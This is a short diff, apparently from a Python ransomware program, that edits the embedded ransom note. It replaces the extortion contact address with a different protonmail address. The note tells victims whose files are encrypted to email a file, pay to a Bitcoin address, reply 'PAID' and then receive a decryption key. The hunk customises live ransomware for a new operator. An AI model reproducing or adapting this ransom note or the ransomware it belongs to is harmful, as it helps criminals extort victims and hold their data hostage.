@@ -155,10 +155,10 @@ Only we can decrypt your files!
 
 To purchase your key and restore your data, please follow these three easy steps:
 
-1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com
+1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to vyclient@protonmail.com
 
 2. You will recieve your personal BTC address for payment.
-   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
+   Once payment has been completed, send another email to vyclient@protonmail.com stating "PAID".
    We will check to see if payment has been paid.
 
 3. You will receive a text file with your KEY that will unlock all your files. 
